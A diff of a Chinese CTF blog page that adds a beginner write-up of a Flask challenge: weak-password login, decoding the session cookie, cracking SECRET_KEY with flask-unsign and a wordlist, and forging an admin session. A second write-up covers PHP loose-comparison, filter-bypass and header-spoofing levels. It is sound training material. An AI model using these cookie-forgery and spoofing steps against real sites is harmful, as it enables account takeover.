@@ -1729,6 +1729,8 @@
       
         
       
+        
+      
     
     
     
@@ -1854,6 +1856,36 @@
     
   
     代码执行
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E4%BC%9A%E8%AF%9D%E5%AE%89%E5%85%A8/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    会话安全
   
 
     
@@ -2158,6 +2190,149 @@
             分类于
             
               <a href="./" class="md-meta__link">新手入门</a>, 
+              <a href="../%E4%BC%9A%E8%AF%9D%E5%AE%89%E5%85%A8/" class="md-meta__link">会话安全</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 2 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="stage1-flasklogin"><a class="toclink" href="../../flasklogin/">Stage1 · FlaskLogin</a></h2>
+<p>这道题强调这是一个用 Flask 做的站点。</p>
+<p><img alt="登录页" src="../../../assets/images/flasklogin/01-login.png" /></p>
+<h3 id="_1"><a class="toclink" href="../../flasklogin/#_1">登录</a></h3>
+<p>页面提示「<code>guest / 123456</code> 之类的弱口令可能还在」。</p>
+<p>试了 <code>123456</code> 不行，换 <code>guest123</code> 进去了。</p>
+<p>登录后是普通用户空间：</p>
+<p><img alt="普通用户空间" src="../../../assets/images/flasklogin/02-guest.png" /></p>
+<p>页面提示：</p>
+<blockquote>
+<p><strong>试试看看你的「身份」是怎么被网站记住的？（F12 → Application → Cookies，那个 session cookie 引起了我的注意）</strong></p>
+</blockquote>
+<div class="admonition note">
+<p class="admonition-title">Firefox 里 Cookie 在哪</p>
+<p><strong>Firefox 的 Cookie 在「存储」(Storage) 面板里，不在「应用程序」里。</strong></p>
+<p>Chrome：Application → Cookies
+Firefox：存储 → Cookie</p>
+</div>
+<h3 id="cookie"><a class="toclink" href="../../flasklogin/#cookie">看 Cookie</a></h3>
+<p>看到 <code>session</code> 的值是：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>eyJ1c2VyIjoiZ3Vlc3QifQ.atybFQ.0due7kkk3LdRwoQPSckRCSMWv88
+</span></code></pre></div>
+<p><strong>注意：只有第一段是 base64，整条不是。</strong></p>
+<p>把第一段 <code>eyJ1c2VyIjoiZ3Vlc3QifQ</code> 拿去 base64 解码：</p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="p">{</span><span class="nt">"user"</span><span class="p">:</span><span class="s2">"guest"</span><span class="p">}</span>
+</span></code></pre></div>
+<p>得到身份就是这一小段 JSON。</p>
+<h3 id="_2"><a class="toclink" href="../../flasklogin/#_2">认出格式</a></h3>
+<p>整条值长这样：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>eyJ1c2VyIjoiZ3Vlc3QifQ . atybFQ . 0due7kkk3LdRwoQPSckRCSMWv88
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>└───── 数据 ─────┘    └时间戳┘  └──────── HMAC 签名 ────────┘
+</span></code></pre></div>
+<p><strong>这是 Flask 默认的签名 session 格式：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>base64(JSON) . base64(时间戳) . base64(HMAC-SHA1)
+</span></code></pre></div>
+<p><strong>签名是拿 <code>SECRET_KEY</code> 对整个 <code>数据.时间戳</code> 算出来的。</strong></p>
+<h3 id="user-admin"><a class="toclink" href="../../flasklogin/#user-admin">直接改 user 为 admin？不行</a></h3>
+<p><strong>把 <code>{"user":"guest"}</code> 改成 <code>{"user":"admin"}</code> 再 base64 回去，塞进 Cookie —— 会被弹回登录页（302）。</strong></p>
+<p><strong>因为签名是对内容算的，内容一改，签名就对不上，服务端直接判无效。</strong></p>
+<p><strong>所以要改身份，必须先拿到 <code>SECRET_KEY</code>，自己重新签一个。</strong></p>
+<h3 id="secret_key"><a class="toclink" href="../../flasklogin/#secret_key">找 SECRET_KEY</a></h3>
+<p>先用 flask 工具爆破字典：</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="n">python</span> <span class="n">-m</span> <span class="n">pip</span> <span class="n">install</span> <span class="n">flask-unsign</span> <span class="n">-i</span> <span class="n">https</span><span class="p">://</span><span class="n">pypi</span><span class="p">.</span><span class="n">tuna</span><span class="p">.</span><span class="n">tsinghua</span><span class="p">.</span><span class="n">edu</span><span class="p">.</span><span class="n">cn</span><span class="p">/</span><span class="n">simple</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="s1">'secret'</span><span class="p">,</span><span class="s1">'dev'</span><span class="p">,</span><span class="s1">'changeme'</span><span class="p">,</span><span class="s1">'ctf2026'</span> <span class="p">|</span> <span class="nb">Set-Content</span> <span class="n">wl</span><span class="p">.</span><span class="n">txt</span>
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="n">python</span> <span class="n">-m</span> <span class="n">flask_unsign</span> <span class="p">-</span><span class="n">-unsign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"eyJ1c2VyIjoiZ3Vlc3QifQ.atybFQ.0due7kkk3LdRwoQPSckRCSMWv88"</span> <span class="p">-</span><span class="n">-wordlist</span> <span class="n">wl</span><span class="p">.</span><span class="n">txt</span>
+</span></code></pre></div>
+<p><strong>同时注意到页面上的 <code>ctf2026</code>（登录页标题 <code>🔑 ctf2026</code>）—— 拿它当 secret 一试就中。</strong></p>
+<h3 id="_3"><a class="toclink" href="../../flasklogin/#_3">重新签名</a></h3>
+<p><img alt="重新签名" src="../../../assets/images/flasklogin/03-sign.png" /></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="n">python</span><span class="p">.</span><span class="n">exe</span> <span class="n">-m</span> <span class="n">flask_unsign</span> <span class="p">-</span><span class="n">-sign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"{'user': 'admin'}"</span> <span class="p">-</span><span class="n">-secret</span> <span class="n">ctf2026</span>
+</span></code></pre></div>
+<p><strong>注意 <code>--cookie</code> 用的是 <strong>Python 字典语法</strong>（单引号），不是 JSON。</strong></p>
+<p>输出一条新的：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>eyJ1c2VyIjoiYWRtaW4ifQ.atyPOw.5-D0uOFDLKt18mszGkl5W9CVBGE
+</span></code></pre></div>
+<p><strong>把它整个替换掉 Cookie 里的 <code>session</code> 值，刷新。</strong></p>
+<div class="admonition warning">
+<p class="admonition-title">两个常见坑</p>
+<p><strong>① 密钥别打错</strong>：<code>ctf2026</code> 是 7 个字符，写成 <code>ctf20206</code> 就废了。</p>
+<p><strong>② 替换的是整条</strong>（三段都要），不是只换第一段。</p>
+</div>
+<h3 id="flag"><a class="toclink" href="../../flasklogin/#flag">拿到 flag</a></h3>
+<p><img alt="Welcome admin" src="../../../assets/images/flasklogin/04-flag.png" /></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>flag{fl4sk_s3ss10n_1s_n07_s3cur3}
+</span></code></pre></div>
+<h3 id="_4"><a class="toclink" href="../../flasklogin/#_4">这题的完整链路</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>① 弱口令登录        guest / guest123
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>② 观察 session      eyJ1c2VyIjoiZ3Vlc3QifQ.atybFQ.xxx
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>③ 解码第一段        {"user":"guest"}
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>④ 认出格式          base64(数据) . 时间戳 . HMAC 签名   ← Flask
+</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>⑤ 直接改内容        ❌ 302（签名校验失败）
+</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>⑥ 找 SECRET_KEY     页面标题 ctf2026 / flask-unsign 爆破
+</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>⑦ 自己重新签名      flask-unsign --sign --cookie "{'user':'admin'}" --secret ctf2026
+</span><span id="__span-30-8"><a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a>⑧ 替换整条 Cookie   → 👑 Welcome, admin → flag
+</span></code></pre></div>
+<h3 id="_5"><a class="toclink" href="../../flasklogin/#_5">知识点</a></h3>
+<p><strong>这题的核心是区分两件事：</strong></p>
+<table>
+<thead>
+<tr>
+<th>情况</th>
+<th>能不能改</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Cookie 里存<strong>明文身份</strong></td>
+<td>✅ 随便改（和前面米米那题第四关一样）</td>
+</tr>
+<tr>
+<td>Cookie 里存<strong>签名过的身份</strong></td>
+<td>❌ 改了签名就废，除非拿到密钥</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Flask 的 session 属于第二种 —— 默认用 <code>SECRET_KEY</code> 做 HMAC-SHA1 签名。</strong></p>
+<p><strong>所以「Flask 站点 + session cookie」这个组合，标准套路就是：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>先试着解码 → 认出 .时间戳.签名 三段式 → 上 flask-unsign
+</span></code></pre></div>
+<h3 id="_6"><a class="toclink" href="../../flasklogin/#_6">工具备忘</a></h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="c"># 只看内容,不需要密钥</span>
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="n">python</span> <span class="n">-m</span> <span class="n">flask_unsign</span> <span class="p">-</span><span class="n">-decode</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"eyJ..."</span>
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="c"># 爆破密钥</span>
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="n">python</span> <span class="n">-m</span> <span class="n">flask_unsign</span> <span class="p">-</span><span class="n">-unsign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"eyJ..."</span> <span class="p">-</span><span class="n">-wordlist</span> <span class="n">wl</span><span class="p">.</span><span class="n">txt</span>
+</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a>
+</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a><span class="c"># 用已知密钥伪造</span>
+</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a><span class="n">python</span> <span class="n">-m</span> <span class="n">flask_unsign</span> <span class="p">-</span><span class="n">-sign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"{'user':'admin'}"</span> <span class="p">-</span><span class="n">-secret</span> <span class="n">ctf2026</span>
+</span></code></pre></div>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
+          <time datetime="2026-10-24 00:00:00+00:00">2026-10-24</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="./" class="md-meta__link">新手入门</a>, 
               <a href="../%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="md-meta__link">代码执行</a></li>
         
         
@@ -2178,90 +2353,90 @@
 <p>第一题米米的奇幻之旅，一共六关，都是很基础的东西。</p>
 <p><img alt="第一关" src="../../../assets/images/mimi-adventure/01-level1.png" /></p>
 <h3 id="_2"><a class="toclink" href="../../mimi-adventure/#_2">第一关 · 数字=字符串的魔法</a></h3>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="x">if($_GET['step1']=='2026'){</span>
-</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="x">    echo '第一关通过！';</span>
-</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="x">if($_GET['step1']=='2026'){</span>
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="x">    echo '第一关通过！';</span>
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="x">}</span>
 </span></code></pre></div>
 <p>首先是一个 PHP 弱比较，直接构造 payload：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>/?step1=2026
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>/?step1=2026
 </span></code></pre></div>
 <p><strong>过。</strong></p>
 <h3 id="_3"><a class="toclink" href="../../mimi-adventure/#_3">第二关 · 穿越消失的文字</a></h3>
 <p><img alt="第二关" src="../../../assets/images/mimi-adventure/02-level2.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="x">$key=$_GET['step2'];</span>
-</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a><span class="x">$key=str_replace('flag', '', $key);</span>
-</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a><span class="x">if($key==='flag'){</span>
-</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a><span class="x">    success;</span>
-</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="x">$key=$_GET['step2'];</span>
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="x">$key=str_replace('flag', '', $key);</span>
+</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a><span class="x">if($key==='flag'){</span>
+</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a><span class="x">    success;</span>
+</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a><span class="x">}</span>
 </span></code></pre></div>
 <p>这关会把 <code>flag</code> 字符替换为空，注意<strong>替换之后拼起来还是 <code>flag</code></strong>，所以双写绕过：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>/?step1=2026&amp;step2=fflaglag
+<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>/?step1=2026&amp;step2=fflaglag
 </span></code></pre></div>
 <div class="admonition warning">
 <p class="admonition-title">纠正一个常见误解</p>
 <p><code>str_replace('flag','',$key)</code> 默认替换<strong>所有</strong>匹配，不是只替换一次。</p>
 <p>双写之所以有效，是因为 <code>fflaglag</code> 里只有<strong>一个</strong> <code>flag</code> 子串（不重叠）：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>f f l a g l a g
-</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>  └─flag─┘              ← 只有这一处
-</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>删掉后 → f + lag = fla g → 又拼回 "flag"
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>f f l a g l a g
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>  └─flag─┘              ← 只有这一处
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>删掉后 → f + lag = fla g → 又拼回 "flag"
 </span></code></pre></div>
 <p>实测：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>原串: fflaglag
-</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a>删掉 'flag' 后: [flag]
-</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a>含 'flag' 出现次数 = 1
+<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>原串: fflaglag
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>删掉 'flag' 后: [flag]
+</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>含 'flag' 出现次数 = 1
 </span></code></pre></div>
 </div>
 <h3 id="_4"><a class="toclink" href="../../mimi-adventure/#_4">第三关 · 来自本机的访客</a></h3>
 <p><img alt="第三关" src="../../../assets/images/mimi-adventure/03-level3.png" /></p>
 <p>提示伪造地址，在 Burp Suite 抓包后在请求头里加上一行：</p>
-<div class="language-http highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="err">X-Forwarded-For: 127.0.0.1</span>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="err">X-Forwarded-For: 127.0.0.1</span>
 </span></code></pre></div>
 <p><strong>过。</strong></p>
 <h3 id="_5"><a class="toclink" href="../../mimi-adventure/#_5">第四关 · 管理员身份卡</a></h3>
 <p><img alt="第四关" src="../../../assets/images/mimi-adventure/04-level4.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="x">if($_COOKIE['admin']=='1'){</span>
-</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a><span class="x">    success;</span>
-</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="x">if($_COOKIE['admin']=='1'){</span>
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="x">    success;</span>
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a><span class="x">}</span>
 </span></code></pre></div>
 <p>Cookie 就是浏览器用来判断用户身份的，所以直接把 cookie 里的全删了，改为：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>admin=1
+<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>admin=1
 </span></code></pre></div>
 <p><strong>过。</strong></p>
 <h3 id="_6"><a class="toclink" href="../../mimi-adventure/#_6">第五关 · 来自东方的语言</a></h3>
 <p><img alt="第五关" src="../../../assets/images/mimi-adventure/05-level5.png" /></p>
 <p>这关说只接待来自喵星的访客，要「语言标记」。</p>
 <p><code>zh-CN</code> 在 <code>Accept-Language</code> 里面已经有了，所以直接把 <code>miao</code> 添加在后面：</p>
-<div class="language-http highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="err">Accept-Language: zh-CN,zh;q=0.9,...,miao</span>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="err">Accept-Language: zh-CN,zh;q=0.9,...,miao</span>
 </span></code></pre></div>
 <p><strong>过。</strong></p>
 <h3 id="boss"><a class="toclink" href="../../mimi-adventure/#boss">第六关 · 最终 Boss 喵</a></h3>
 <p><img alt="第六关" src="../../../assets/images/mimi-adventure/06-level6.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="x">$pwd=$_GET["pwd"];</span>
-</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a><span class="x">if($pwd==0 &amp;&amp; strlen($pwd)&gt;0){</span>
-</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a><span class="x">    flag</span>
-</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="x">$pwd=$_GET["pwd"];</span>
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a><span class="x">if($pwd==0 &amp;&amp; strlen($pwd)&gt;0){</span>
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a><span class="x">    flag</span>
+</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a><span class="x">}</span>
 </span></code></pre></div>
 <p>说要既满足等于 0 又要长度大于 0，那不就是 <code>0</code> 吗：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>/?step1=2026&amp;step2=fflaglag&amp;pwd=0
+<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>/?step1=2026&amp;step2=fflaglag&amp;pwd=0
 </span></code></pre></div>
 <p><strong>过了。</strong></p>
 <h3 id="_7"><a class="toclink" href="../../mimi-adventure/#_7">第六关的考点（当时没想明白）</a></h3>
 <p>一开始觉得「这不就是 0 吗」，后来明白出题人想考的其实是 <strong><code>==</code> 松散比较的坑</strong>：</p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a><span class="x">var_dump("abc" == 0);    // PHP 7 下 → bool(true)</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="x">var_dump("abc" == 0);    // PHP 7 下 → bool(true)</span>
 </span></code></pre></div>
 <p><strong>在 PHP 7 里，任意「非数字字符串」和 0 做 <code>==</code> 比较，结果都是 <code>true</code>。</strong></p>
 <p>所以第六关的正确解法其实非常多：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>?pwd=0        ← 我用的,长度 1,数值也是 0
-</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a>?pwd=abc      ← 更"标准"的答案,长度 3,但 == 0 为真
-</span><span id="__span-61-3"><a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a>?pwd=admin    ← 一样能过
+<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>?pwd=0        ← 我用的,长度 1,数值也是 0
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>?pwd=abc      ← 更"标准"的答案,长度 3,但 == 0 为真
+</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>?pwd=admin    ← 一样能过
 </span></code></pre></div>
 <p><code>pwd=0</code> 只是碰巧也对，<strong>真正的知识点是 <code>"任意字符" == 0 为 true</code></strong>。</p>
 <p>（PHP 8 之后这个坑被修了，<code>"abc" == 0</code> 变成 <code>false</code>。）</p>
 <h3 id="payload"><a class="toclink" href="../../mimi-adventure/#payload">最终 payload</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>/?step1=2026&amp;step2=fflaglag&amp;pwd=0
+<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>/?step1=2026&amp;step2=fflaglag&amp;pwd=0
 </span></code></pre></div>
 <p><img alt="拿到 flag" src="../../../assets/images/mimi-adventure/07-flag.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>flag{4a950787-6159-4af4-adea-c8a40ffd8e34}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>flag{4a950787-6159-4af4-adea-c8a40ffd8e34}
 </span></code></pre></div>
 <h3 id="_8"><a class="toclink" href="../../mimi-adventure/#_8">六关小结</a></h3>
 <table>
